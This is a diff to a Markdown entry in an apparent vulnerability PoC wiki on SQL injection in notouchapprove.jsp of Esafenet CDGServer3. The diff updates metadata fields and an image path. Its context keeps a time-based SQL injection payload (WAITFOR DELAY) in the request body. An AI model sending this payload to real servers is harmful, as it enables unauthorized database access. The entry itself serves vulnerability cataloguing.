@@ -10,12 +10,12 @@ content_status: "needs-review"
 primary_identifiers: ""
 referenced_identifiers: ""
 identifier_status: "unknown"
-identifier_role: ""
+identifier_role: "unknown"
 version: "CDGServer3"
 prerequisites: "来源未完整说明认证/角色/配置前提；不假定匿名可达；FOFA 指纹已在原文"
 side_effects: "unknown；复现前核对写入、凭据、出网与恢复要求"
 source: "SourByte05/Vulnerability-Wiki-PoC"
-source_status: "archived-verified"
+source_status: "recorded"
 source_url: "https://github.com/SourByte05/Vulnerability-Wiki-PoC/blob/main/2026/11/亿赛通电子文档安全管理系统 notouchapprove.jsp 存在SQL注入漏洞/亿赛通电子文档安全管理系统 notouchapprove.jsp 存在SQL注入漏洞.md"
 ---
 
@@ -77,7 +77,7 @@ Content-Type: application/x-www-form-urlencoded
 id=1'WAITFOR+DELAY'0%3a0%3a5'--
 ```
 
-![image](assets/image-20261110110531-ehye97q.png)
+![image](../../../.resource/remote/f90422411e35c24d8e9a09016f42993d1ea87e3b640c2a26046d4f60591d8a2d.png)
 
 **sonrt规则：**
 
